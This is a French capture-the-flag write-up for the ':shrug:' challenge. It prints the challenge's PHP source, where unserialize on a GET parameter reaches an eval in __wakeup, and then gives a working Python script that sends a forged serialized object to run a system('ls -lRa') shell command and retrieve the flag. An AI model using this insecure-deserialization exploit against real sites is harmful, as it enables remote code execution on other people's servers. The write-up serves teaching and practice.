# :shrug: - 20 pts

> http://shrug.interiut.ctf/

La page a la bonne idée de nous donner son code source :

```php
 <?php
// ¯\_(ツ)_/¯

highlight_file(__FILE__);

class Boussole {
    public $order;

    public function __construct() {
        if(isset($_POST['b_order'])) {
            $this -> order = $_POST['b_order'];
        } else {
            $this -> order = "eau";
        }
    }

    public function __wakeup() {
        echo $this -> kevin($this -> order);
    }

    public function kevin($order) {
        $drinks = ["eau", "moscow_mule", "dark_n_stormy", "mojito", "sex_on_the_beach", "duchesse"];
        if(in_array($order, $drinks)) {
            return "Votre " . $order . " est en préparation.";
        } else {
            eval($order);
        }
    }
}

$a = $_GET['dio'];
$b = $_GET['jotaro'];
$c = $_POST['stand'];

if(isset($a) && isset($b) && isset($c)) {
    if($c == "Hermit Purple") {
        unserialize($_GET['dio']);
    }
}
```

Drôle de code... Si l'on envoie les paramètres `dio` en GET, `jotaro` en GET et `stand` en POST et que `stand` est égal à `Hermit Purple` alors le contenu de `dio` est désérialisé !

Je me dis que quitte à avoir le code, autant le copie sur mon propre serveur en mettant des `echo` partout et en activant les warnings pour gagner du temps. Je lance également le code dans une console PHP interactive :

```php
php> $b = new Boussole;
php> echo serialize($b);
O:8:"Boussole":1:{s:5:"order";s:3:"eau";}
```

Comme on le voit dans le code de la page, si la boisson n'est pas dans la liste alors on fait un `eval` dessus. Voici le code Python pour exécuter une commande shell :

```python
import requests
from urllib.parse import quote_plus

payload = "system('ls -lRa');"
serial = quote_plus('O:8:"Boussole":1:{s:5:"order";s:'+str(len(payload))+':"'+payload+'";}')

r = requests.post(f"http://shrug.interiut.ctf/?dio={serial}&jotaro=b", data={'stand':'Hermit Purple', 'b_order':"1"})

print(r.content.decode())
```

On obtient la liste des fichiers et l'on voit un fichier au nom étrange que l'on peut lire directement dans le navigateur : http://shrug.interiut.ctf/b0e4c25d3de6860f7a396a8148a42fda.txt

```
H2G2{Uns3rial1z4tiOn_iS_eAsY_r1ght?}
```

